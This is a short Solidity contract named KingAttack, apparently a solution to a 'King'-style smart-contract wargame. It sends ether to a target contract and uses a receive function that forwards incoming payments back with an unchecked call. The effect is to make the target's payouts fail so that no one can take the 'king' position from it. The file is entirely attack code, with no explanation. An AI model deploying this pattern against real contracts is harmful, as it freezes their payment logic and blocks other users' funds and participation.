// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address payable target;

    constructor(address payable _target) payable {
        target = _target;
    }

    function attack() external payable {
        target.call{value: msg.value}("");
    }

    receive() external payable {
        target.call{value: msg.value}("");
    }
}
